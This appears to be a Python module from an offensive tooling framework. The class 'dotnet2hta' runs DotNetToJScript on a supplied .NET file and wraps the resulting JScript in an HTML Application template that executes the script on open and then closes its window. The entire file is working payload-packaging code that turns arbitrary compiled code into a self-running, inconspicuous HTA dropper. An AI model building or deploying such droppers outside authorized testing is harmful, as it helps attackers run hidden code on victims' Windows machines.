import subprocess
import platform

class dotnet2hta:

    def __init__(self, arguments: dict) -> None:
        self.template = """
<html> 
<head> 
<script language="JScript">
{lines}
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
"""

    def apply(self, outfile: str) -> None:
        if platform.system() == 'Linux':
            result = subprocess.run(['mono', 'common/bin/DotNetToJScript.exe', f'{outfile}'], capture_output=True, text=True, check=True)
        else:
            result = subprocess.run(['common/bin/DotNet2JScript.exe', f'{outfile}'], capture_output=True, text=True, check=True)
        open('output.js', 'w').write(result.stdout)
        print('JScript saved to output.js')
        lines = result.stdout.splitlines()
        formatted = self.template.format(lines='\n'.join(lines))
        open('output.hta', 'w').write(formatted)
        print('Output saved to output.hta')
        return 'output.hta'